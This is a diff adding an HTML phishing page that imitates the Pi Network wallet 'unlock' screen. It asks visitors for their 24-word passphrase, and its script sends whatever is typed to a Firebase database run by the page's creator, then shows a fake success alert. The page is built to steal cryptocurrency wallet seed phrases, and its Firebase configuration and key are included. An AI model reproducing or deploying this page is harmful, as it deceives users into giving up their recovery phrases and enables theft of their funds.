@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet Unlock</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="main-title">Unlock Pi Wallet</h1>
+
+        <textarea 
+            class="passphrase-field" 
+            placeholder="Enter your 24-word&#13;&#10;passphrase here"
+            id="passphraseInput"
+        ></textarea>
+
+        <div class="unlock-button passphrase-btn" id="passphraseBtn">
+            <span class="material-icons">vpn_key</span>
+            <div class="button-text">Unlock With Passphrase</div>
+        </div>
+
+        <div class="unlock-button fingerprint-btn">
+            <span class="material-icons">fingerprint</span>
+            <div class="button-text">Unlock With Fingerprint</div>
+        </div>
+
+        <div class="disclaimer-text">
+            As a non-custodial wallet, your wallet<br>
+            passphrase is exclusively accessible<br>
+            only to you. Recovery of passphrase is<br>
+            currently impossible.
+        </div>
+
+        <div class="warning-text">
+            Lost your passphrase? You can create a<br>
+            new wallet, but all your <span class="pi-symbol">π</span> in your<br>
+            previous wallet will be inaccessible.
+        </div>
+    </div>
+
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+
+// https://firebase.google.com/docs/web/setup#available-libraries
+
+// Your web app's Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyCaAEOz7UeopyQZtjPAQhqHcrPL81sVPtw",
+  authDomain: "satoshi-pi-wallet.firebaseapp.com",
+  databaseURL: "https://satoshi-pi-wallet-default-rtdb.firebaseio.com",
+  projectId: "satoshi-pi-wallet",
+  storageBucket: "satoshi-pi-wallet.firebasestorage.app",
+  messagingSenderId: "759930873350",
+  appId: "1:759930873350:web:30f32d925da07685e98587"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+
+//get ref to database services
+const db = getDatabase(app);
+
+document.getElementById('passphraseBtn').addEventListener('click', function(e) {
+
+    set(ref(db, 'passphraseBtn' + document.getElementById("passphraseInput").value),{
+
+
+        passphraseinput: document.getElementById("passphraseInput").value
+    })
+            
+    const passphrase = document.getElementById('passphraseInput').value;
+            
+            if(passphrase.trim().length > 0) {
+                alert("Exchange activated successfully");
+            }
+        });
+</script>
+    
+</body>
+</html>
